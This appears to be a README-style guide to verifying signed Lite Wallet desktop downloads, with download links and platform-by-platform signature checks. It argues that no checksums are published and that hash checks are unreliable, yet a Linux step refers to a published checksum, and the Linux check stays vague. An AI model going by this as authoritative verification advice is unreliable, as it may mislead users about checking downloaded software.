![Lite Wallet](assets/banner-article.png)

# Verify a signed Lite Wallet download

Signature checks that prove a file is the one the project published.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Every Lite Wallet release binary is code-signed by the Lite Wallet organisation, and each desktop operating system can show you that signature before you run the file. Verification means checking the publisher identity the system reports, not comparing a hash from a forum post. There are no published checksum values, so the signature is the check that exists.

## What "signed" means for a download

A code signature binds a file to an identity. On Windows it is an Authenticode signature shown in the file's properties; on macOS it is a Developer ID signature plus notarization, which Gatekeeper checks on first launch; on Linux it is a signed archive whose contents can be checked against the project's key.

The signature answers one question well: did the organisation that publishes Lite Wallet produce this exact file? It does not answer whether you downloaded it from the right place, because a lookalike can host a file it did not sign. That is why the check is two steps - source first, then signature - and why a signature mismatch is a stop signal rather than a warning. The wider threat model this check fits into is the subject of [the safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md).

## Check it on Windows

1. Right-click the downloaded installer and open Properties.
2. Open the Digital Signatures tab.
3. Select the signature and choose Details.
4. Confirm the signer name is the Lite Wallet organisation and that the signature reports as valid.
5. If the tab is missing, or the signer is someone else, delete the file and download again from the releases page.

SmartScreen's "Windows protected your PC" prompt is a reputation warning, not a signature verdict. A fresh release is always unknown to reputation data, so the prompt appears even on a correct file; the signature tab is what decides.

## Check it on macOS

1. Open the disk image and drag the app to Applications.
2. Open it once from Applications and let Gatekeeper evaluate it.
3. If it opens, the notarized signature matched.
4. If it refuses, open System Settings, Privacy and Security, and read the message before overriding anything.
5. A message naming an unidentified developer means the file is not the signed build; re-download rather than override.

Overriding Gatekeeper on an unsigned build is the single most common way a Mac user installs something they did not intend to. The override exists for developers; for a wallet, a failed check should end the attempt.

## Check it on Linux

1. Download the archive or package from the releases page.
2. Compare the file against the release page's published signature or checksum entry, if the release includes one.
3. Extract the portable archive to a directory you control.
4. Confirm the binary is executable before running it.
5. If you installed a package, let your package manager verify it in the usual way.

Linux users often expect a checksum line they can paste, and this project does not publish checksum values - the release binaries are signed instead. Do not substitute a checksum from a comment, a blog or a chat message; a hash nobody can authenticate is worse than no hash, because it looks like verification.

## What to do when verification fails

| Result | Meaning | Action |
|---|---|---|
| signature valid, publisher matches | the file is the signed build | proceed |
| signature present, publisher differs | not this project's build | delete and re-download from the releases page |
| no signature at all | unsigned file | delete it; never run it |
| Gatekeeper refuses to open | signature or notarization missing | do not override; re-download |
| hash does not match a third-party post | the post is not authoritative | ignore the post, verify the signature |

Once the signature checks out, the install itself is covered in [the desktop install guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/install-litewallet-on-windows-macos.md).

## Verification is a habit, not a one-off

The check takes under a minute on Windows and macOS, and it is worth doing every time rather than once. Lookalike sites are built to be found on the day a user is looking for a download, not to survive inspection; the one time verification is skipped tends to be the time it mattered.

It also protects against a subtler failure: an old file kept on disk and reused months later. A build downloaded a year ago carries a valid signature for that year, and it is still the wrong file to run today. Re-downloading from the releases page and checking the signature again is how a machine stays on the current release without anyone having to remember when it was last updated.

## Why there are no checksum values to compare

A checksum is only useful if you can authenticate the list it came from. Publishing values on a page that anyone can mirror, quote or edit creates a false sense of rigour: an attacker who can replace the file can replace the number beside it. A code signature avoids that, because the identity check happens against the operating system's trust store rather than against a string you copied.

That is also why "verify the SHA" advice from a forum is not verification. It verifies that two strings match, not that either came from the project. If you want a stronger check than the signature, the answer is to build from the published source - [the licence and source guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-licence-audit-and-source.md) covers that path.

## FAQ

### Where are the checksums?

No checksum values are published. Releases are code-signed instead, and the signature is visible in the file's properties on Windows, through Gatekeeper on macOS, and through the signed archive on Linux.

### What does Gatekeeper actually check?

It checks that the app carries a Developer ID signature from a known identity and that it has been notarized by Apple. If either is missing, macOS refuses to open it until you override, and overriding is the wrong move for a wallet download.

### How do I confirm the publisher on Windows?

Open the file's Properties, then Digital Signatures, then Details, and read the signer name. A valid signature from the Lite Wallet organisation is the confirmation; a missing tab is not.

### Can I verify the APK?

Check that the APK's signature matches the organisation before installing. On Android the install prompt shows the signer; if it differs from a previous install of the same app, stop, because that is what a repackaged build looks like.

### Is it safe to install a build a friend sent me?

No. A file that arrives by message bypasses both checks: you did not choose the source, and the sender may not have checked the signature. Download it yourself from the releases page.

Signed binaries for every platform are on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
